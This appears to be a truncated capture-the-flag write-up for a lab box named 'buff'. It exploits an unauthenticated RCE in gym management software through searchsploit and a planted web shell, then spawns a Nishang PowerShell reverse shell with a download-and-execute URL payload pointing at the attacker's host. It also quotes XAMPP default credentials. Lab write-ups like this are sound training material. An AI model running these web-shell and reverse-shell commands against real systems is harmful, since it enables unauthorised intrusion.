# buff

nmap scan shows that we have 2 ports open, they are 8080,7680

lets browse the 8080 http port first. as we keep navigating the pages, we see there is something here

![](../../.gitbook/assets/image%20%286%29.png)

there is something called a gym management software here, which the first thing we do is searchsploit and it shows us that we have unauthenticated RCE which is the most interested one for us

![](../../.gitbook/assets/image%20%287%29.png)

lets get the python script using `searchsploit -m php/webapps/48506.py`. our exploit script exits without conecting to any web shell as such, but if we look at the script, its making use of this  
[`http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami`](http://10.10.10.198:8080/upload/kamehameha.php?telepathy=whoami)\`\`

![](../../.gitbook/assets/image%20%285%29.png)

we got a shell kind of thing here, so now, I'm going to use nishang powershell script to get us back a reverse shell

lets host the Nishang `Invoke-PowerShellTcp.ps1` script on our webserver and run it from the uploaded web shell that we have, and we will get a reverse shell from this

```text
http://10.10.10.198:8080/upload/kamehameha.php?telepathy=powershell%20%22iex(new-object%20net.webclient).downloadstring(%27http://10.10.14.28/sh.ps1%27)%22
```

![reverse shell](../../.gitbook/assets/image%20%288%29.png)

we found a `passwords.txt` on the machine

```text
### XAMPP Default Passwords ###

1) MySQL (phpMyAdmin):

   User: root
   Password:
   (means no password!)

2) FileZilla FTP:

   [ You have to create a new user on the FileZilla Interface ] 

3) Mercury (not in the USB & lite version): 

   Postmaster: Postmaster (postmaster@localhost)
   Administrator: Admin (admin@localhost)

   User: newuser  
   Password: wampp 

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
   
   Please do not forget to refresh the WEBDAV authentification (users and passwords)
```

so, now we got a first shell, and there are couple of listening ports, I want to 

